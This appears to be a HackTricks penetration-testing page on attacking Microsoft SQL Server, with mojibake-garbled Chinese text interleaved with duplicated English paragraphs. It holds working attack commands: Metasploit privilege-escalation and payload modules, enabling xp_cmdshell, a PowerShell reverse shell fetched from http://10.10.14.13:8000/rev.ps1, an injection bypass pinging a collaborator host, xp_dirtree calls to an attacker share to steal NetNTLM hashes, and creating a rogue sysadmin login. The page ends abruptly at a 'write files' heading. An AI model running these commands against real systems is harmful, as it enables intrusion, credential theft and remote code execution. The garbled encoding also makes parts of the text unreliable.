# 1433 - Pentesting MSSQL - Microsoft SQL Server

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ‚¨å¯ä»¥æ›´å¿«åœ°ä¿®å¤å®ƒä»¬ã€‚Intruderè·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œå‘ç°æ•´ä¸ªæŠ€æœ¯å †æ ˆä¸­çš„é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ç«‹å³å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## åŸºæœ¬ä¿¡æ¯

**Microsoft SQL Server**æ˜¯ç”±Microsoftå¼€å‘çš„**å…³ç³»å‹æ•°æ®åº“**ç®¡ç†ç³»ç»Ÿã€‚ä½œä¸ºæ•°æ®åº“æœåŠ¡å™¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªè½¯ä»¶äº§å“ï¼Œå…¶ä¸»è¦åŠŸèƒ½æ˜¯æ ¹æ®å…¶ä»–è½¯ä»¶åº”ç”¨ç¨‹åºçš„è¯·æ±‚å­˜å‚¨å’Œæ£€ç´¢æ•°æ®ï¼Œè¿™äº›åº”ç”¨ç¨‹åºå¯ä»¥åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šè¿è¡Œï¼Œä¹Ÿå¯ä»¥åœ¨ç½‘ç»œï¼ˆåŒ…æ‹¬äº’è”ç½‘ï¼‰ä¸Šçš„å¦ä¸€å°è®¡ç®—æœºä¸Šè¿è¡Œã€‚\
æ¥è‡ª[wikipedia](https://en.wikipedia.org/wiki/Microsoft\_SQL\_Server)ã€‚

**é»˜è®¤ç«¯å£ï¼š** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### **é»˜è®¤çš„MS-SQLç³»ç»Ÿè¡¨**

* **masteræ•°æ®åº“**ï¼šè®°å½•SQL Serverå®ä¾‹çš„æ‰€æœ‰ç³»ç»Ÿçº§ä¿¡æ¯ã€‚
* **msdbæ•°æ®åº“**ï¼šè¢«SQL Server Agentç”¨äºè°ƒåº¦è­¦æŠ¥å’Œä½œä¸šã€‚
* **modelæ•°æ®åº“**ï¼šç”¨ä½œåœ¨SQL Serverå®ä¾‹ä¸Šåˆ›å»ºçš„æ‰€æœ‰æ•°æ®åº“çš„æ¨¡æ¿ã€‚å¯¹modelæ•°æ®åº“è¿›è¡Œçš„ä¿®æ”¹ï¼Œå¦‚æ•°æ®åº“å¤§å°ã€æ’åºè§„åˆ™ã€æ¢å¤æ¨¡å‹å’Œå…¶ä»–æ•°æ®åº“é€‰é¡¹ï¼Œå°†åº”ç”¨äºä¹‹ååˆ›å»ºçš„ä»»ä½•æ•°æ®åº“ã€‚
* **Resourceæ•°æ®åº“**ï¼šæ˜¯ä¸€ä¸ªåªè¯»æ•°æ®åº“ï¼ŒåŒ…å«SQL Serveré™„å¸¦çš„ç³»ç»Ÿå¯¹è±¡ã€‚ç³»ç»Ÿå¯¹è±¡åœ¨Resourceæ•°æ®åº“ä¸­ç‰©ç†ä¸ŠæŒä¹…å­˜åœ¨ï¼Œä½†åœ¨æ¯ä¸ªæ•°æ®åº“çš„sysæ¨¡å¼ä¸­é€»è¾‘ä¸Šå‡ºç°ã€‚
* **tempdbæ•°æ®åº“**ï¼šæ˜¯ä¸€ä¸ªç”¨äºä¿å­˜ä¸´æ—¶å¯¹è±¡æˆ–ä¸­é—´ç»“æœé›†çš„å·¥ä½œç©ºé—´ã€‚

## æšä¸¾

### è‡ªåŠ¨æšä¸¾

å¦‚æœå¯¹æœåŠ¡ä¸€æ— æ‰€çŸ¥ï¼š
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
{% hint style="info" %}
å¦‚æœæ‚¨**æ²¡æœ‰**å‡­æ®ï¼Œå¯ä»¥å°è¯•çŒœæµ‹å®ƒä»¬ã€‚æ‚¨å¯ä»¥ä½¿ç”¨nmapæˆ–metasploitã€‚è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨ä½¿ç”¨ç°æœ‰ç”¨æˆ·åå¤šæ¬¡ç™»å½•å¤±è´¥ï¼Œå¯èƒ½ä¼š**é”å®šå¸æˆ·**ã€‚
{% endhint %}

#### Metasploitï¼ˆéœ€è¦å‡­æ®ï¼‰
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**æš´åŠ›ç ´è§£**](../../generic-methodologies-and-resources/brute-force.md#sql-server)

### æ‰‹åŠ¨æšä¸¾

#### ç™»å½•
```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### å¸¸è§æšä¸¾

##### Service Detection

##### æœåŠ¡æ£€æµ‹

To begin with, we need to identify if the target system is running Microsoft SQL Server. We can use various methods to achieve this.

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ç¡®å®šç›®æ ‡ç³»ç»Ÿæ˜¯å¦æ­£åœ¨è¿è¡ŒMicrosoft SQL Serverã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å„ç§æ–¹æ³•æ¥å®ç°è¿™ä¸€ç‚¹ã€‚

One common method is to use a port scanning tool like Nmap to scan for open ports on the target system. By default, Microsoft SQL Server listens on TCP port 1433. If this port is open, it indicates that the system may be running Microsoft SQL Server.

ä¸€ä¸ªå¸¸è§çš„æ–¹æ³•æ˜¯ä½¿ç”¨ç«¯å£æ‰«æå·¥å…·ï¼ˆå¦‚Nmapï¼‰æ‰«æç›®æ ‡ç³»ç»Ÿä¸Šçš„å¼€æ”¾ç«¯å£ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒMicrosoft SQL Serverç›‘å¬TCPç«¯å£1433ã€‚å¦‚æœè¯¥ç«¯å£å¼€æ”¾ï¼Œè¡¨ç¤ºç³»ç»Ÿå¯èƒ½æ­£åœ¨è¿è¡ŒMicrosoft SQL Serverã€‚

Another method is to use banner grabbing to obtain information about the running services on the target system. This can be done using tools like Telnet or Netcat. By connecting to the target system on port 1433 and examining the banner response, we can determine if Microsoft SQL Server is running.

å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨æ¨ªå¹…æŠ“å–æ¥è·å–æœ‰å…³ç›®æ ‡ç³»ç»Ÿä¸Šæ­£åœ¨è¿è¡Œçš„æœåŠ¡çš„ä¿¡æ¯ã€‚å¯ä»¥ä½¿ç”¨Telnetæˆ–Netcatç­‰å·¥å…·æ¥å®Œæˆã€‚é€šè¿‡è¿æ¥åˆ°ç›®æ ‡ç³»ç»Ÿçš„1433ç«¯å£å¹¶æ£€æŸ¥æ¨ªå¹…å“åº”ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šæ˜¯å¦æ­£åœ¨è¿è¡ŒMicrosoft SQL Serverã€‚

##### Version Detection

##### ç‰ˆæœ¬æ£€æµ‹

Once we have identified that the target system is running Microsoft SQL Server, the next step is to determine the version of the server. This information can be useful in identifying potential vulnerabilities and selecting appropriate exploitation techniques.

ä¸€æ—¦ç¡®å®šç›®æ ‡ç³»ç»Ÿæ­£åœ¨è¿è¡ŒMicrosoft SQL Serverï¼Œä¸‹ä¸€æ­¥æ˜¯ç¡®å®šæœåŠ¡å™¨çš„ç‰ˆæœ¬ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬è¯†åˆ«æ½œåœ¨çš„æ¼æ´å¹¶é€‰æ‹©é€‚å½“çš„åˆ©ç”¨æŠ€æœ¯ã€‚

One way to determine the version is by querying the server using SQL statements. For example, we can execute the following query to retrieve the version information:

ç¡®å®šç‰ˆæœ¬çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨SQLè¯­å¥æŸ¥è¯¢æœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ä»¥æ£€ç´¢ç‰ˆæœ¬ä¿¡æ¯ï¼š

```sql
SELECT @@VERSION;
```

This query will return the version information of the Microsoft SQL Server.

æ­¤æŸ¥è¯¢å°†è¿”å›Microsoft SQL Serverçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚

Another method is to use tools like Nmap or Metasploit to perform version detection. These tools have built-in scripts and modules that can identify the version of Microsoft SQL Server running on the target system.

å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨Nmapæˆ–Metasploitç­‰å·¥å…·è¿›è¡Œç‰ˆæœ¬æ£€æµ‹ã€‚è¿™äº›å·¥å…·å…·æœ‰å†…ç½®çš„è„šæœ¬å’Œæ¨¡å—ï¼Œå¯ä»¥è¯†åˆ«ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œçš„Microsoft SQL Serverçš„ç‰ˆæœ¬ã€‚

##### Enumeration of Databases

##### æ•°æ®åº“æšä¸¾

Once we have identified the version of Microsoft SQL Server, we can proceed with enumerating the databases hosted on the server. This step is important as it allows us to gather information about the structure and content of the databases, which can be useful in further exploitation.

ä¸€æ—¦ç¡®å®šäº†Microsoft SQL Serverçš„ç‰ˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­æšä¸¾æ‰˜ç®¡åœ¨æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“ã€‚è¿™ä¸€æ­¥éª¤å¾ˆé‡è¦ï¼Œå› ä¸ºå®ƒå…è®¸æˆ‘ä»¬æ”¶é›†æœ‰å…³æ•°æ®åº“çš„ç»“æ„å’Œå†…å®¹çš„ä¿¡æ¯ï¼Œè¿™å¯¹è¿›ä¸€æ­¥çš„åˆ©ç”¨éå¸¸æœ‰ç”¨ã€‚

There are several methods to enumerate databases in Microsoft SQL Server. One common method is to use SQL statements to query the server for a list of databases. For example, we can execute the following query to retrieve the names of all databases:

æœ‰å‡ ç§æ–¹æ³•å¯ä»¥æšä¸¾Microsoft SQL Serverä¸­çš„æ•°æ®åº“ã€‚ä¸€ç§å¸¸è§çš„æ–¹æ³•æ˜¯ä½¿ç”¨SQLè¯­å¥æŸ¥è¯¢æœåŠ¡å™¨ä»¥è·å–æ•°æ®åº“åˆ—è¡¨ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ä»¥æ£€ç´¢æ‰€æœ‰æ•°æ®åº“çš„åç§°ï¼š

```sql
SELECT name FROM sys.databases;
```

This query will return the names of all databases hosted on the server.

æ­¤æŸ¥è¯¢å°†è¿”å›æ‰˜ç®¡åœ¨æœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰æ•°æ®åº“çš„åç§°ã€‚

Another method is to use tools like Nmap or Metasploit, which have built-in scripts and modules for enumerating databases in Microsoft SQL Server.

å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨Nmapæˆ–Metasploitç­‰å·¥å…·ï¼Œè¿™äº›å·¥å…·å…·æœ‰ç”¨äºæšä¸¾Microsoft SQL Serverä¸­æ•°æ®åº“çš„å†…ç½®è„šæœ¬å’Œæ¨¡å—ã€‚

##### Enumeration of Tables and Columns

##### è¡¨å’Œåˆ—çš„æšä¸¾

Once we have identified the databases hosted on the server, the next step is to enumerate the tables and columns within each database. This step is crucial as it allows us to identify sensitive data and potential targets for further exploitation.

ä¸€æ—¦ç¡®å®šäº†æ‰˜ç®¡åœ¨æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“ï¼Œä¸‹ä¸€æ­¥æ˜¯æšä¸¾æ¯ä¸ªæ•°æ®åº“ä¸­çš„è¡¨å’Œåˆ—ã€‚è¿™ä¸€æ­¥éª¤éå¸¸é‡è¦ï¼Œå› ä¸ºå®ƒå…è®¸æˆ‘ä»¬è¯†åˆ«æ•æ„Ÿæ•°æ®å’Œè¿›ä¸€æ­¥åˆ©ç”¨çš„æ½œåœ¨ç›®æ ‡ã€‚

To enumerate tables and columns, we can use SQL statements to query the server. For example, we can execute the following query to retrieve the names of all tables within a specific database:

ä¸ºäº†æšä¸¾è¡¨å’Œåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨SQLè¯­å¥æŸ¥è¯¢æœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ä»¥æ£€ç´¢ç‰¹å®šæ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„åç§°ï¼š

```sql
SELECT name FROM sys.tables;
```

This query will return the names of all tables within the specified database.

æ­¤æŸ¥è¯¢å°†è¿”å›æŒ‡å®šæ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„åç§°ã€‚

Similarly, we can execute SQL statements to retrieve the names of columns within a specific table. For example, we can execute the following query to retrieve the names of all columns within a table:

ç±»ä¼¼åœ°ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡ŒSQLè¯­å¥æ¥æ£€ç´¢ç‰¹å®šè¡¨ä¸­åˆ—çš„åç§°ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ä»¥æ£€ç´¢è¡¨ä¸­æ‰€æœ‰åˆ—çš„åç§°ï¼š

```sql
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('table_name');
```

This query will return the names of all columns within the specified table.

æ­¤æŸ¥è¯¢å°†è¿”å›æŒ‡å®šè¡¨ä¸­æ‰€æœ‰åˆ—çš„åç§°ã€‚

There are also tools like Nmap or Metasploit that have built-in scripts and modules for enumerating tables and columns in Microsoft SQL Server.

è¿˜æœ‰ä¸€äº›å·¥å…·ï¼Œå¦‚Nmapæˆ–Metasploitï¼Œå®ƒä»¬å…·æœ‰ç”¨äºæšä¸¾Microsoft SQL Serverä¸­è¡¨å’Œåˆ—çš„å†…ç½®è„šæœ¬å’Œæ¨¡å—ã€‚

##### Enumeration of Users and Privileges

##### ç”¨æˆ·å’Œæƒé™çš„æšä¸¾

Another important aspect of enumeration is to identify the users and their privileges within the Microsoft SQL Server. This information can help us in understanding the access levels and potential targets for privilege escalation.

æšä¸¾çš„å¦ä¸€ä¸ªé‡è¦æ–¹é¢æ˜¯ç¡®å®šMicrosoft SQL Serverä¸­çš„ç”¨æˆ·åŠå…¶æƒé™ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥å¸®åŠ©æˆ‘ä»¬äº†è§£è®¿é—®çº§åˆ«å’Œæ½œåœ¨çš„ç‰¹æƒå‡çº§ç›®æ ‡ã€‚

To enumerate users and their privileges, we can use SQL statements to query the server. For example, we can execute the following query to retrieve the names of all users within the server:

ä¸ºäº†æšä¸¾ç”¨æˆ·åŠå…¶æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨SQLè¯­å¥æŸ¥è¯¢æœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ä»¥æ£€ç´¢æœåŠ¡å™¨ä¸­æ‰€æœ‰ç”¨æˆ·çš„åç§°ï¼š

```sql
SELECT name FROM sys.syslogins;
```

This query will return the names of all users within the server.

æ­¤æŸ¥è¯¢å°†è¿”å›æœåŠ¡å™¨ä¸­æ‰€æœ‰ç”¨æˆ·çš„åç§°ã€‚

Similarly, we can execute SQL statements to retrieve the privileges assigned to a specific user. For example, we can execute the following query to retrieve the privileges assigned to a user:

ç±»ä¼¼åœ°ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡ŒSQLè¯­å¥æ¥æ£€ç´¢åˆ†é…ç»™ç‰¹å®šç”¨æˆ·çš„æƒé™ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ä»¥æ£€ç´¢åˆ†é…ç»™ç”¨æˆ·çš„æƒé™ï¼š

```sql
EXEC sp_helpuser 'username';
```

This query will return the privileges assigned to the specified user.

æ­¤æŸ¥è¯¢å°†è¿”å›åˆ†é…ç»™æŒ‡å®šç”¨æˆ·çš„æƒé™ã€‚

There are also tools like Nmap or Metasploit that have built-in scripts and modules for enumerating users and their privileges in Microsoft SQL Server.

è¿˜æœ‰ä¸€äº›å·¥å…·ï¼Œå¦‚Nmapæˆ–Metasploitï¼Œå®ƒä»¬å…·æœ‰ç”¨äºæšä¸¾Microsoft SQL Serverä¸­ç”¨æˆ·åŠå…¶æƒé™çš„å†…ç½®è„šæœ¬å’Œæ¨¡å—ã€‚
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
```
#### è·å–ç”¨æˆ·

{% content-ref url="types-of-mssql-users.md" %}
[types-of-mssql-users.md](types-of-mssql-users.md)
{% endcontent-ref %}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### è·å–æƒé™

å…³äºMSSQLæœ¯è¯­çš„ä¸€äº›ä»‹ç»ï¼š

1. **å¯ä¿æŠ¤èµ„æºï¼ˆSecurableï¼‰ï¼š** è¿™äº›æ˜¯SQL Serveræ•°æ®åº“å¼•æ“æˆæƒç³»ç»Ÿæ§åˆ¶è®¿é—®çš„èµ„æºã€‚å¯ä¿æŠ¤èµ„æºå¯ä»¥åˆ†ä¸ºä¸‰ä¸ªæ›´å¹¿æ³›çš„ç±»åˆ«ï¼š
* æœåŠ¡å™¨ - ä¾‹å¦‚æ•°æ®åº“ã€ç™»å½•ã€ç«¯ç‚¹ã€å¯ç”¨æ€§ç»„å’ŒæœåŠ¡å™¨è§’è‰²
* æ•°æ®åº“ - ä¾‹å¦‚æ•°æ®åº“è§’è‰²ã€åº”ç”¨ç¨‹åºè§’è‰²ã€æ¨¡å¼ã€è¯ä¹¦ã€å…¨æ–‡ç›®å½•ã€ç”¨æˆ·
* æ¨¡å¼ - ä¾‹å¦‚è¡¨ã€è§†å›¾ã€å­˜å‚¨è¿‡ç¨‹ã€å‡½æ•°ã€åŒä¹‰è¯
2. **æƒé™ï¼ˆPermissionï¼‰ï¼š** æ¯ä¸ªSQL Serverå¯ä¿æŠ¤èµ„æºéƒ½æœ‰å…³è”çš„æƒé™ï¼Œå¦‚ALTERã€CONTROLã€CREATEï¼Œå¯ä»¥æˆäºˆç»™ä¸»ä½“ã€‚æƒé™åœ¨æœåŠ¡å™¨çº§åˆ«ä½¿ç”¨ç™»å½•åè¿›è¡Œç®¡ç†ï¼Œåœ¨æ•°æ®åº“çº§åˆ«ä½¿ç”¨ç”¨æˆ·è¿›è¡Œç®¡ç†ã€‚
3. **ä¸»ä½“ï¼ˆPrincipalï¼‰ï¼š** æ¥æ”¶å¯¹å¯ä¿æŠ¤èµ„æºçš„æƒé™çš„å®ä½“ç§°ä¸ºä¸»ä½“ã€‚æœ€å¸¸è§çš„ä¸»ä½“æ˜¯ç™»å½•åå’Œæ•°æ®åº“ç”¨æˆ·ã€‚é€šè¿‡æˆäºˆæˆ–æ‹’ç»æƒé™ï¼Œæˆ–å°†ç™»å½•åå’Œç”¨æˆ·æ·»åŠ åˆ°å…·æœ‰è®¿é—®æƒé™çš„è§’è‰²ä¸­ï¼Œæ¥æ§åˆ¶å¯¹å¯ä¿æŠ¤èµ„æºçš„è®¿é—®ã€‚
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## æŠ€å·§

### æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œè¦èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œä¸ä»…éœ€è¦å¯ç”¨ **`xp_cmdshell`**ï¼Œè¿˜éœ€è¦å¯¹ **`xp_cmdshell`** å­˜å‚¨è¿‡ç¨‹å…·æœ‰ **EXECUTE æƒé™**ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼ˆé™¤ sysadmins å¤–ï¼‰å¯ä»¥ä½¿ç”¨ **`xp_cmdshell`** çš„ç”¨æˆ·ï¼š
```sql
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
{% endhint %}
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' â€”
```
### çªƒå–NetNTLMå“ˆå¸Œå€¼ / ä¸­ç»§æ”»å‡»

æ‚¨åº”è¯¥å¯åŠ¨ä¸€ä¸ª**SMBæœåŠ¡å™¨**æ¥æ•è·åœ¨èº«ä»½éªŒè¯ä¸­ä½¿ç”¨çš„å“ˆå¸Œå€¼ï¼ˆä¾‹å¦‚`impacket-smbserver`æˆ–`responder`ï¼‰ã€‚
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
{% hint style="warning" %}
æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥é™¤ç³»ç»Ÿç®¡ç†å‘˜ä¹‹å¤–çš„ç”¨æˆ·æ˜¯å¦å…·æœ‰è¿è¡Œè¿™äº›MSSQLå‡½æ•°çš„æƒé™ï¼š
```sql
Use master;
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```
{% endhint %}

ä½¿ç”¨è¯¸å¦‚**responder**æˆ–**Inveigh**ä¹‹ç±»çš„å·¥å…·ï¼Œå¯ä»¥**çªƒå–NetNTLMå“ˆå¸Œ**ã€‚\
æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®äº†è§£å¦‚ä½•ä½¿ç”¨è¿™äº›å·¥å…·ï¼š

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

### æ»¥ç”¨MSSQLçš„å¯ä¿¡é“¾æ¥

[**é˜…è¯»æ­¤æ–‡ç« **](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md) **ä»¥è·å–æœ‰å…³å¦‚ä½•æ»¥ç”¨æ­¤åŠŸèƒ½çš„æ›´å¤šä¿¡æ¯ï¼š**

{% content-ref url="../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md" %}
[abusing-ad-mssql.md](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md)
{% endcontent-ref %}

### **å†™å…¥æ–‡ä»¶**

